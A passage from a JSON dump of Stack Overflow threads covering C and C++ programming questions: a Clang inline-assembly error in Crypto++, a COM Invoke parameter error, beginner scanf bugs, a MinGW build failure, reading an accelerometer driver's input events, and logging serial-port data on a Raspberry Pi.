Integrated Assembler is used (and not the system assembler, like GAS). I'm having trouble determining the exact problem (and fix) for:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ make\nclang++ -DNDEBUG -g2 -O3 -Wall -fPIC -march=native -pipe -c gcm.cpp\n...\ngcm.cpp:676:3: error: invalid operand for instruction\n                AS2(    movd    WORD_REG(di), xmm...\n                ^\n./cpu.h:221:20: note: expanded from macro 'AS2'\n        #define AS2(x, y) GNU_AS2(x, y)\n                          ^\n./cpu.h:216:27: note: expanded from macro 'GNU_AS2'\n        #define GNU_AS2(x, y) \"\\n\\t\" #x \", \" #y \";\"\n                             ^\n&lt;inline asm&gt;:110:12: note: instantiated into assembly here\n        movd rdi, xmm0;\n                  ^~~~~\ngcm.cpp:685:3: error: invalid operand for instruction\n                AS2(    movd    WORD_REG(di), xmm...\n                ^\n./cpu.h:221:20: note: expanded from macro 'AS2'\n        #define AS2(x, y) GNU_AS2(x, y)\n                          ^\n./cpu.h:216:27: note: expanded from macro 'GNU_AS2'\n        #define GNU_AS2(x, y) \"\\n\\t\" #x \", \" #y \";\"\n                                 ^\n&lt;inline asm&gt;:117:12: note: instantiated into assembly here\n        movd rdi, xmm1;\n                  ^~~~~\n</code></pre>\n\n<p>I <strong><em>think</em></strong> the errors above may be related to <a href=\"http://clang.llvm.org/compatibility.html#inline-asm\" rel=\"nofollow\">Inline Assembly and Compatibility</a>. But as far as I know, <code>rdi</code> is 64-bits, <code>xmm1</code> is 128-bits, and the <code>movd</code> specifies the operand size, so the compatibility issue should not apply.</p>\n\n<p>What is the problem with the code above?</p>\n\n<hr>\n\n<p>You can examine the source file online at <a href=\"http://www.cryptopp.com/docs/ref/gcm_8cpp_source.html\" rel=\"nofollow\">Crypto++ gcm.cpp Source File</a>. The issue should be easy to duplicate if you have Clang installed:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>git clone https://github.com/weidai11/cryptopp.git cryptopp-asm\ncd cryptopp-asm\nexport CXX=clang++\nmake GAS210_OR_LATER=1 GAS219_OR_LATER=1 GAS219_OR_LATER=1\n</code></pre>\n\n<p>Or:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code># Try to make just gcm.o\nmake GAS210_OR_LATER=1 GAS219_OR_LATER=1 GAS219_OR_LATER=1 gcm.o\n</code></pre>\n\n<p>The odd looking <code>make</code> line is due to <a href=\"https://llvm.org/bugs/show_bug.cgi?id=24200\" rel=\"nofollow\">LLVM Bug 24200 - With integrated assembler enabled, failed to fetch version string of assembler</a>.</p>\n"}, {"tags": ["c++", "c", "com", "mfc", "activex"], "comments": [{"owner": {"reputation": 33827, "user_id": 506413, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1a474f3be606bcc6f964913b523626e9?s=128&d=identicon&r=PG", "display_name": "Jonathan Potter", "link": "https://stackoverflow.com/users/506413/jonathan-potter"}, "edited": false, "score": 0, "creation_date": 1437557913, "post_id": 31558850, "comment_id": 51074847, "body": "Try providing a variant for the result value (pVarResult)."}, {"owner": {"reputation": 160, "user_id": 1239755, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/68e480e26a95d5d32fa82922304bb935?s=128&d=identicon&r=PG", "display_name": "wan", "link": "https://stackoverflow.com/users/1239755/wan"}, "reply_to_user": {"reputation": 33827, "user_id": 506413, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1a474f3be606bcc6f964913b523626e9?s=128&d=identicon&r=PG", "display_name": "Jonathan Potter", "link": "https://stackoverflow.com/users/506413/jonathan-potter"}, "edited": false, "score": 0, "creation_date": 1437558473, "post_id": 31558850, "comment_id": 51075232, "body": "@JonathanPotter pVarResult is empty after invoke"}], "answers": [{"tags": [], "owner": {"reputation": 2822, "user_id": 1366673, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf94cf8fe9b542830a7f96973ca2ddd9?s=128&d=identicon&r=PG&f=1", "display_name": "Sam", "link": "https://stackoverflow.com/users/1366673/sam"}, "is_accepted": false, "score": 0, "last_activity_date": 1437558188, "creation_date": 1437558188, "answer_id": 31559491, "question_id": 31558850, "link": "https://stackoverflow.com/questions/31558850/com-invalid-number-of-parameters-when-pdispatch-invoke/31559491#31559491", "title": "com: Invalid number of parameters when pDispatch-&gt;invoke()", "body": "<pre><code>VARIANT pVarResult;\nEXCEPINFO pExceptInfo;\nUINT pArgErr;\nhResult = pDispatch-&gt;Invoke(id, IID_NULL,  \n      LOCALE_SYSTEM_DEFAULT,DISPATCH_METHOD, &amp;pParams, &amp;pVarResult, &amp;pExceptInfo, &amp;pArgErr);\n</code></pre>\n\n<p>Try providing the other params</p>\n"}, {"tags": [], "owner": {"reputation": 870061, "user_id": 17034, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Cii6b.png?s=128&g=1", "display_name": "Hans Passant", "link": "https://stackoverflow.com/users/17034/hans-passant"}, "is_accepted": false, "score": 1, "last_activity_date": 1437562234, "creation_date": 1437562234, "answer_id": 31561017, "question_id": 31558850, "link": "https://stackoverflow.com/questions/31558850/com-invalid-number-of-parameters-when-pdispatch-invoke/31561017#31561017", "title": "com: Invalid number of parameters when pDispatch-&gt;invoke()", "body": "<pre><code>  [id(1)] boolean Open(BSTR filepath, BSTR rootname);\n</code></pre>\n\n<p>You cannot call this function with IDispatch, it does not have the correct signature.  It can only work when the return type of the function is HRESULT.  A correct declaration would look like:</p>\n\n<pre><code>  [id(1)] HRESULT Open(BSTR filepath, BSTR rootname, [out, retval]VARIANT_BOOL* retval);\n</code></pre>\n\n<p>COM functions in general have a very strong requirement to return HRESULT, it is also required to properly marshal the call across apartment boundaries.  It is the only way that a failure error code can be returned. </p>\n"}, {"tags": [], "owner": {"reputation": 160, "user_id": 1239755, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/68e480e26a95d5d32fa82922304bb935?s=128&d=identicon&r=PG", "display_name": "wan", "link": "https://stackoverflow.com/users/1239755/wan"}, "is_accepted": true, "score": 0, "last_activity_date": 1437565205, "creation_date": 1437565205, "answer_id": 31562061, "question_id": 31558850, "link": "https://stackoverflow.com/questions/31558850/com-invalid-number-of-parameters-when-pdispatch-invoke/31562061#31562061", "title": "com: Invalid number of parameters when pDispatch-&gt;invoke()", "body": "<p>Thanks everyone for you time.<br>\nIt's my stupid mistake to cause this problem. Because I use MFC library to implement the COM control. And in MFC framework, if you want to export a interface, you must use a macro to declare it. like this.</p>\n\n<pre><code>DISP_FUNCTION(MyCtrl, \"Open\", Open, VT_BOOL, VTS_BSTR VTS_BSTR)\n</code></pre>\n\n<p>What I write is:</p>\n\n<pre><code>DISP_FUNCTION(MyCtrl, \"Open\", Open, VT_BOOL, VTS_BSTR, VTS_BSTR)\n</code></pre>\n\n<p>The comma should not be added between two VTS_BSTR.</p>\n"}], "owner": {"reputation": 160, "user_id": 1239755, "user_type": "registered", "accept_rate": 27, "profile_image": "https://www.gravatar.com/avatar/68e480e26a95d5d32fa82922304bb935?s=128&d=identicon&r=PG", "display_name": "wan", "link": "https://stackoverflow.com/users/1239755/wan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 534, "favorite_count": 1, "accepted_answer_id": 31562061, "answer_count": 3, "score": 0, "last_activity_date": 1437565205, "creation_date": 1437556480, "last_edit_date": 1437561918, "question_id": 31558850, "link": "https://stackoverflow.com/questions/31558850/com-invalid-number-of-parameters-when-pdispatch-invoke", "title": "com: Invalid number of parameters when pDispatch-&gt;invoke()", "body": "<p>For some reason I must use a COM control in my code. I want to invoke a method exported by the COM control. </p>\n\n<p>idl file:  </p>\n\n<pre><code>methods: \n    [id(1)] boolean Open(BSTR filepath, BSTR rootname);\n</code></pre>\n\n<p>cpp file:</p>\n\n<pre><code>VARIANT pVarResult;\nEXCEPTINFO pExcepInfo;\nunsigned int puArgErr;\nDISPPARAMS pParams;\nmemset(&amp;pParams, 0, sizeof(DISPPARAMS));\n\nVARIANTARG param[2];\nparam[0].vt = VT_BSTR;\nparam[0].bstrVar = filepath.AllocSysString();\nparam[1].vt = VT_BSTR;\nparam[1].bstrVar = rootname.AllocSysString();\n\npParams.rgvars = param;\npParams.cArgs = 2;\nhResult = pDispatch-&gt;Invoke(id, IID_NULL, LOCALE_SYSTEM_DEFAULT,  \n             DISPATCH_METHOD, &amp;pParams, &amp;pVarResult, &amp;pExcepInfo, &amp;puArgErr);\n</code></pre>\n\n<p>I get a error say \"<strong>Invalid number of parameters</strong>\". Where is wrong of my code?\nHow to pass two strings params to a interface defined in a com control? It seems impossible.</p>\n\n<p>EDIT 1: add more return info. It seems useless.</p>\n\n<pre><code>pVarResult = NULL;\npExcepInfo.wcode = 52424;\npuArgErr = 1;\n</code></pre>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 2, "creation_date": 1437556948, "post_id": 31558814, "comment_id": 51074182, "body": "Do you really have a nested function or is it something with the indenting?"}, {"owner": {"reputation": 2975, "user_id": 1170333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3e73428522352ea6f8b8488b21e8fc24?s=128&d=identicon&r=PG", "display_name": "prajmus", "link": "https://stackoverflow.com/users/1170333/prajmus"}, "edited": false, "score": 0, "creation_date": 1437557453, "post_id": 31558814, "comment_id": 51074560, "body": "You&#39;re comparing string (pointer) with integer instead of &quot;None&quot; literal"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1437557533, "post_id": 31558814, "comment_id": 51074599, "body": "@SouravGhosh: it&#39;s not a nested function, but there are two standalone scopes after the <code>for</code>, which is probably not what the OP wanted."}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1437557666, "post_id": 31558814, "comment_id": 51074683, "body": "@MOehm I was talking  about <code>average()</code> function."}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "reply_to_user": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1437557832, "post_id": 31558814, "comment_id": 51074795, "body": "@SouravGhosh: Okay, missed that. (Good place to hide it, though. The formatting <i>and</i> the program logic are a mess.)"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "reply_to_user": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1437557889, "post_id": 31558814, "comment_id": 51074827, "body": "@MOehm That is why I <i>moved on</i>. :-)"}, {"owner": {"reputation": 26941, "user_id": 2979617, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/whfql.png?s=128&g=1", "display_name": "M Oehm", "link": "https://stackoverflow.com/users/2979617/m-oehm"}, "edited": false, "score": 0, "creation_date": 1437558842, "post_id": 31558814, "comment_id": 51075523, "body": "<i>I have been working on this code for a week now</i> - Perhaps you should start over from scratch, because the program in its current state is balely readable. What do you want to achieve? It looks as if you tried to get information on a number of people (without storing it)  and then determine the avarage age and how many people are from Texas. Is that right?"}, {"owner": {"reputation": 1, "user_id": 5142214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6d901d4f8b729fd7a8576a3fb24eef0?s=128&d=identicon&r=PG&f=1", "display_name": "Mark", "link": "https://stackoverflow.com/users/5142214/mark"}, "edited": false, "score": 0, "creation_date": 1437561083, "post_id": 31558814, "comment_id": 51077088, "body": "and I would start over but Im running out of time I have until the end of today to finish this."}], "answers": [{"tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": false, "score": 3, "last_activity_date": 1437556826, "last_edit_date": 1437556826, "creation_date": 1437556458, "answer_id": 31558843, "question_id": 31558814, "link": "https://stackoverflow.com/questions/31558814/why-are-my-scanf-statements-not-working/31558843#31558843", "title": "why are my scanf statements not working?", "body": "<p>The issue, as I see it is with</p>\n\n<pre><code>if (personsName == None)\n</code></pre>\n\n<p>This is not the way to compare two <em>string</em>. You need to use <a href=\"http://linux.die.net/man/3/strcmp\" rel=\"nofollow\"><code>strcmp()</code></a> to compare the contents.</p>\n\n<p>Also, the two successive <code>scanf()</code>s has same argument to store the input. The second <code>scanf()</code> will overwrite the previously taken input.</p>\n\n<p>FWIW, <code>None</code> is not a <em>string</em>, however. You need to use <code>\"None\"</code> to denote a string.</p>\n\n<p>That said, uncontrolled input through <code>scanf()</code> can lead to buffer overflows. Better to limit your <em>scanning</em> with the length specifier, like</p>\n\n<pre><code> scanf(\"%99s\", personsName);\n</code></pre>\n\n<p>and so on.</p>\n"}], "owner": {"reputation": 1, "user_id": 5142214, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c6d901d4f8b729fd7a8576a3fb24eef0?s=128&d=identicon&r=PG&f=1", "display_name": "Mark", "link": "https://stackoverflow.com/users/5142214/mark"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 249, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1437558972, "creation_date": 1437556379, "last_edit_date": 1437558972, "question_id": 31558814, "link": "https://stackoverflow.com/questions/31558814/why-are-my-scanf-statements-not-working", "title": "why are my scanf statements not working?", "body": "<p>I am a beginner but I have been working on this code for a week now and I cannot get my <code>scanf</code> functions to work. All of my <code>printf</code> functions output just fine but if I go to input my information to test my code I do not get anything. Am I missing something simple here?    </p>\n\n<pre><code>#include &lt;stdio.h&gt;\nfloat average(float a[]);\nint main ()\n{\n    /* variable definition: */\n    char personsName[100];\n    char personsAge[3];\n    char personsState[20];\n    float Age, Texas;\n    int people,age,i,count,Avg,None;\n    // Loop through 50 people\n    for (people=0; people &lt;2 ; people++)\n    {\n\n        Age =0.0;\n        printf(\"Enter Persons Name \\n\");\n        scanf(\"%s\", personsName);\n        printf(\"Enter None if this is last family member. \\n\");\n        scanf(\"%s\", personsName);\n        {\n            if (personsName == None)\n                break;\n        }\n    }\n    {\n        printf(\"Enter Persons Age \\n\");\n        scanf(\"%s\", personsAge);\n        float average(float a[])\n        {\n            printf(\"Average of all family members is %f \\n\");\n            int i;\n            float avg, sum=0.0;\n            for(i=0;i&lt;50;++i)\n                sum+=a[i];\n            avg =(sum/i);\n\n            return avg;\n        }\n    }\n    {\n        printf(\"Enter Persons State \\n\");\n        scanf(\"%s\", personsState);\n        while (Texas &gt; 0)\n        {\n            printf(\"Enter Texas\\n\");\n            scanf(\"%f\",&amp;Texas);\n            //Only assign if positive\n            if (Texas &gt; 0)\n            {\n                personsState[count]=Texas;\n                count = count + 1;\n                break;\n            }\n        }\n    }\n    // Print data\n    for (i=0; i&lt;count;i++)\n    {\n        printf (\"Texas %f is %d\\n\", i,personsState[i]);\n        if (count == 50)\n            break;\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "windows", "mingw"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "edited": false, "score": 0, "creation_date": 1437556527, "post_id": 31558731, "comment_id": 51073868, "body": "This macro looks suspiciously wrong. Should be <code>#define sleep(x) Sleep((x)*1000)</code>"}, {"owner": {"reputation": 81, "user_id": 4644760, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/10203832415626086/picture?type=large", "display_name": "Hyounmin Wang", "link": "https://stackoverflow.com/users/4644760/hyounmin-wang"}, "edited": false, "score": 0, "creation_date": 1437556667, "post_id": 31558731, "comment_id": 51073995, "body": "sadly its because of copy and paste issue to stackoverflow. I have updated it to #define sleep(x) Sleep((x)*1000). Error is not concerning that but I have no clue why this is happening at mingw."}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": true, "score": 0, "last_activity_date": 1437557998, "creation_date": 1437557998, "answer_id": 31559410, "question_id": 31558731, "link": "https://stackoverflow.com/questions/31558731/compiling-c-with-mingw-in-windows-libusbmuxd-compiling/31559410#31559410", "title": "Compiling c with mingw in windows libusbmuxd compiling", "body": "<p>It is <em>probably</em> (see later*) a local problem on your machine, because looking at <a href=\"https://github.com/libimobiledevice/libusbmuxd/blob/1.0.10/src/libusbmuxd.c\" rel=\"nofollow\">the code</a> the line is fine. Some header file might be corrupted/broken. You could check <code>&lt;winsock2.h&gt;</code> which is included directly above and could be responsible for the compiler error at this position:</p>\n\n<pre><code>#ifdef WIN32\n#include &lt;windows.h&gt;\n#include &lt;winsock2.h&gt;\n#define sleep(x) Sleep(x*1000)\n</code></pre>\n\n<p>So you could for example preprocess the source file (<code>cpp -E libusbmuxd.c &gt;libusbmuxd_pp.c</code>) and check the result. (try to compile it to find the new line number of the error).</p>\n\n<p>*) Btw, my <code>cpp</code> in MinGW gives me this:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>D:\\test&gt;cpp -E test.c &gt;test2.c\nIn file included from test.c:45:0:\nd:\\mingw\\x86_64-w64-mingw32\\include\\winsock2.h:15:2: warning: #warning  Please include winsock2.h before windows.h [-Wcpp]\n #warning Please include winsock2.h before windows.h\n  ^\n</code></pre>\n\n<p>So maybe interchanging the <code>#include</code> directives in the source could already solve this.</p>\n"}], "owner": {"reputation": 81, "user_id": 4644760, "user_type": "registered", "accept_rate": 25, "profile_image": "https://graph.facebook.com/10203832415626086/picture?type=large", "display_name": "Hyounmin Wang", "link": "https://stackoverflow.com/users/4644760/hyounmin-wang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 374, "favorite_count": 0, "accepted_answer_id": 31559410, "answer_count": 1, "score": -1, "last_activity_date": 1437557998, "creation_date": 1437556138, "last_edit_date": 1437556600, "question_id": 31558731, "link": "https://stackoverflow.com/questions/31558731/compiling-c-with-mingw-in-windows-libusbmuxd-compiling", "title": "Compiling c with mingw in windows libusbmuxd compiling", "body": "<p>So I have successfully got to a point where I am compiling libusbmuxd on windows mingw to use it for windows platform.</p>\n\n<p>However although autogen.sh and configure is done without error</p>\n\n<p>it fails to make libusbmuxd at below . Does anyone have any idea on this? Is there a clear instruction on how to build in windows? </p>\n\n<pre><code>$ make\nmake all-recursive\nmake[1]: Entering directory /home/Naver/libusbmuxd-1.0.10' Making all in common make[2]: Entering directory/home/Naver/libusbmuxd-1.0.10/common'\nCC collection.lo\nCCLD libinternalcommon.la\nmake[2]: Leaving directory /home/Naver/libusbmuxd-1.0.10/common' Making all in src make[2]: Entering directory/home/Naver/libusbmuxd-1.0.10/src'\nCC libusbmuxd.lo\nlibusbmuxd.c:46:26: error: expected ';', ',' or ')' before numeric constant\n#define sleep(x) Sleep(x*1000)\n^\nlibusbmuxd.c:46:25: error: expected ';', ',' or ')' before '' token\n#define sleep(x) Sleep(x*1000)\n^\nmake[2]: ** [libusbmuxd.lo] Error 1\nmake[2]: Leaving directory /home/Naver/libusbmuxd-1.0.10/src' make[1]: *** [all-recursive] Error 1 make[1]: Leaving directory/home/Naver/libusbmuxd-1.0.10'\nmake: *** [all] Error 2\n</code></pre>\n"}, {"tags": ["c", "driver"], "comments": [{"owner": {"reputation": 528, "user_id": 3083333, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2aea2d9f71f42d8984a03edcd0b7b918?s=128&d=identicon&r=PG", "display_name": "garlix", "link": "https://stackoverflow.com/users/3083333/garlix"}, "edited": false, "score": 0, "creation_date": 1447687908, "post_id": 31558594, "comment_id": 55246213, "body": "Hi, what have you tried so far? The one you linked is the driver. Once you have build it on your kernel you should find some files under <code>&#47;sys</code>. To read data from your sensor you have to read from that files..."}], "answers": [{"tags": [], "owner": {"reputation": 501, "user_id": 4456198, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/37717781209f9a089d554ba05ce28ba3?s=128&d=identicon&r=PG&f=1", "display_name": "runner", "link": "https://stackoverflow.com/users/4456198/runner"}, "is_accepted": true, "score": 1, "last_activity_date": 1447817229, "creation_date": 1447817229, "answer_id": 33771306, "question_id": 31558594, "link": "https://stackoverflow.com/questions/31558594/unable-read-output-from-lsm9ds0-acc-mag-device-driver/33771306#33771306", "title": "unable read output from lsm9ds0_acc_mag device driver", "body": "<p>When ever this lsm9ds0_acc_mag driver gets installed, it creates corresponding event files under the directory <em>/dev/input/</em> with a file name <strong>eventx</strong> ( where x can take any integer value starting from 1).</p>\n\n<p>Reading <em>/dev/input/eventx</em> this file you will get the accelerometer values in X Y and Z directions</p>\n\n<p>I used the following code</p>\n\n<pre><code>#define ACCELEROMETER \"/dev/input/event2\"\nstruct input_event event;\n\nU32 u32X;\nU32 u32Y;\nU32 u32Z;\n\nvoid getCaliberate()\n{\n    U16 fd;\n\n    ssize_t ret;\n\n    fd = open(ACCELEROMETER, O_RDONLY | O_NDELAY);\n    if(fd == -1)\n    {\n        printf(\"Unable to open /dev\");\n    }\n\n    while(ret=read(fd, &amp;event, sizeof(struct input_event)))\n    {\n        if (ret != -1)\n        {\n            if (event.type == EV_ABS)\n            {\n\n                printf(\"type = %d\\t\", event.type);\n\n                if (event.code == 0)\n                    u32X = event.value;\n                if (event.code == 1)\n                    u32Y = event.value;\n                if (event.code == 2)\n                    u32Z = event.value;\n            }\n        }\n        else\n        {\n            printf(\"Read failed\\n\");\n        }\n    }\n</code></pre>\n"}], "owner": {"reputation": 501, "user_id": 4456198, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/37717781209f9a089d554ba05ce28ba3?s=128&d=identicon&r=PG&f=1", "display_name": "runner", "link": "https://stackoverflow.com/users/4456198/runner"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "accepted_answer_id": 33771306, "answer_count": 1, "score": 1, "last_activity_date": 1447817229, "creation_date": 1437555734, "last_edit_date": 1437555892, "question_id": 31558594, "link": "https://stackoverflow.com/questions/31558594/unable-read-output-from-lsm9ds0-acc-mag-device-driver", "title": "unable read output from lsm9ds0_acc_mag device driver", "body": "<p>I am unable to find a way to read the output values of the sensors from <strong>lam9ds0</strong> driver \n<a href=\"https://github.com/erlerobot/kernel_lsm9ds0/tree/master/i2c\" rel=\"nofollow\">https://github.com/erlerobot/kernel_lsm9ds0/tree/master/i2c</a></p>\n\n<p>The driver code is available in the above link named <strong>lsm9ds0_acc_mag.c</strong></p>\n\n<p>Anyone familiar with device driver coding, please help me to get the output values. I am new to device driver concepts.</p>\n\n<p>I have tried assembly language but that doesn't suit my project requirement.</p>\n"}, {"tags": ["c", "raspberry-pi", "port", "raspbian"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1437556322, "post_id": 31558141, "comment_id": 51073747, "body": "Please format your code."}, {"owner": {"reputation": 73, "user_id": 4963688, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/b3247604227dc51c812fae00dabdf107?s=128&d=identicon&r=PG&f=1", "display_name": "Athena", "link": "https://stackoverflow.com/users/4963688/athena"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1437557339, "post_id": 31558141, "comment_id": 51074488, "body": "@MichaelWalz Sorry... format..? meaning to?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1437557575, "post_id": 31558141, "comment_id": 51074627, "body": "Format or ident means putting blank space at the beginning of each line in order to represent the blocks of your program so it is more readable. Look at <i>your</i> program and look at the examples in your C textbook, you will notice the difference"}, {"owner": {"reputation": 119882, "user_id": 3545273, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/RDWxl.png?s=128&g=1", "display_name": "Serge Ballesta", "link": "https://stackoverflow.com/users/3545273/serge-ballesta"}, "edited": false, "score": 0, "creation_date": 1437559166, "post_id": 31558141, "comment_id": 51075736, "body": "Is your input line oriented text, or can it contain binary data ? And how do you intend to go out of your <code>while(1)</code> loop (break could loose data)?"}], "answers": [{"tags": [], "owner": {"reputation": 4683, "user_id": 2978901, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/5f4c47814ee6a385d2cf6447d75ac1d9?s=128&d=identicon&r=PG&f=1", "display_name": "Pandrei", "link": "https://stackoverflow.com/users/2978901/pandrei"}, "is_accepted": false, "score": 0, "last_activity_date": 1437556487, "creation_date": 1437556487, "answer_id": 31558852, "question_id": 31558141, "link": "https://stackoverflow.com/questions/31558141/write-data-received-from-com-port-to-txt-file-raspbian/31558852#31558852", "title": "Write data received from com port to .txt file (raspbian)", "body": "<p>The first problem is that you are trying to print a string, and your buffer is not formatted correctly: a string ends with a '\\0', and the printf will be looking for that.</p>\n\n<p>You can either read 254 characters and manually add the '\\0' as the last character or use some other mechanism (cout for example).</p>\n\n<p>But even that is more messy. There is a more difficult to implement, but much more elegant solution:</p>\n\n<ol>\n<li>Read is a blocking function; i.e it will block until you read the expected amount of data. You can avoid this by configuring the port you are reading from to be non blocking (see O_NONBLOCK)</li>\n<li>Use select with a timeout, to know when data becomes available</li>\n<li><p>When data is available, read it like so:</p>\n\n<p>nr_bytes = read( fd, buf, 255 );</p>\n\n<p>Yes it's the same read you were using only this time it return once it reads the available data instead of waiting for all 255 bytes. So you have  just read <code>nr_bytes</code> bytes, which you can write to your file.</p></li>\n<li><p>Repeat...</p></li>\n</ol>\n\n<p>Hope this helps!</p>\n"}], "owner": {"reputation": 73, "user_id": 4963688, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/b3247604227dc51c812fae00dabdf107?s=128&d=identicon&r=PG&f=1", "display_name": "Athena", "link": "https://stackoverflow.com/users/4963688/athena"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 762, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1525660697, "creation_date": 1437554498, "last_edit_date": 1437557754, "question_id": 31558141, "link": "https://stackoverflow.com/questions/31558141/write-data-received-from-com-port-to-txt-file-raspbian", "title": "Write data received from com port to .txt file (raspbian)", "body": "<p>Basically I had a com port connected to raspberry pi and I am trying to append the data received into a .txt file. So far I'm only successful in opening the file.. How should I edit the existing code to make it able to \"save\" the data into the open file?</p>\n\n<p>I did also tried editing it by:</p>\n\n<pre><code>FILE *f;\nf = fopen(\"try.txt\", \"a\");\n\n    if (f == NULL)\n    {\n    printf(\"Error opening file!\\n\");\n    exit(1);\n    }\n\nint r;        \nchar buf[255];       \n    while( 1 )\n    {        \n    r = read( fd, buf, 255 );        \n    buf[r]=0;        \n    fprintf( f, \"%s\", buf);\n    }\nfclose(f);\n</code></pre>\n\n<p>but seems like this will stop the data from being received.</p>\n\n<p>Now the existing code is the following:</p>\n\n<pre><code>#include &lt;fcntl.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;termios.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;strings.h&gt;\n\n#define SPEED B9600\n#define PORT \"/dev/ttyUSB0\"\n\nint main( )\n{      \nint fd = open( PORT, O_RDONLY | O_NOCTTY );        \n    if (fd &lt;0) \n    {\n    perror(PORT); \n    exit(-1); \n    }        \nstruct termios options;\n\nbzero(&amp;options, sizeof(options));        